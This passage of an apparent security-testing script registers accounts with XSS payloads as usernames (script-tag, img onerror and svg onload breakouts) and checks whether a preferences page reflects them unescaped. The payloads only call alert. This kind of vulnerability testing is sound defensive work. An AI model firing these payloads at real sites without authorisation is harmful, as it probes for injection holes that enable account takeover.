session2 = register_and_login(xss_username, "testpass123")
if session2:
    prefs_response2 = access_preferences(session2, xss_username)
    save_full_html(prefs_response2.text, "/tmp/preferences_xss.html")
    extract_javascript(prefs_response2.text)
    
    # Show full HTML
    print("\n" + "="*80)
    print("FULL HTML CONTENT - XSS USERNAME")
    print("="*80)
    print(prefs_response2.text)
    
    # Check if payload is reflected
    print("\n" + "="*80)
    print("XSS VULNERABILITY CHECK")
    print("="*80)
    if "<script>alert('XSS')</script>" in prefs_response2.text:
        print("[!!!] RAW SCRIPT TAG FOUND IN RESPONSE - LIKELY VULNERABLE!")
    elif "alert('XSS')" in prefs_response2.text:
        print("[!] Alert payload found in response")
    elif "&lt;script&gt;" in prefs_response2.text:
        print("[+] Script tags are HTML encoded (safer)")
    else:
        print("[?] Payload not obviously reflected")

# Test 3: Different XSS vectors
print("\n\n")
print("="*80)
print("TEST 3: ALTERNATIVE XSS VECTORS")
print("="*80)

xss_vectors = [
    ("xss'><script>alert(1)</script>", "Breaking out of quotes"),
    ('xss"><img src=x onerror=alert(1)>', "Image onerror handler"),
    ("xss'><svg/onload=alert(1)>", "SVG onload"),
]

for vector, description in xss_vectors:
    print(f"\n[*] Testing: {description}")
    print(f"[*] Payload: {vector}")
    
    session_test = register_and_login(vector, "testpass123")
    if session_test:
        prefs_test = access_preferences(session_test, vector)
        
        # Check for unescaped payload
        if vector in prefs_test.text:
            print(f"[!!!] UNESCAPED PAYLOAD FOUND IN RESPONSE!")
            print(f"[!!!] Vector '{description}' appears to be vulnerable!")
            # Show context
            idx = prefs_test.text.find(vector)
            if idx != -1:
                context = prefs_test.text[max(0, idx-100):min(len(prefs_test.text), idx+len(vector)+100)]
                print(f"\nContext around payload:")
                print(context)
        else:
            print(f"[+] Payload not found unescaped (may be encoded/filtered)")

print("\n[*] All tests completed!")
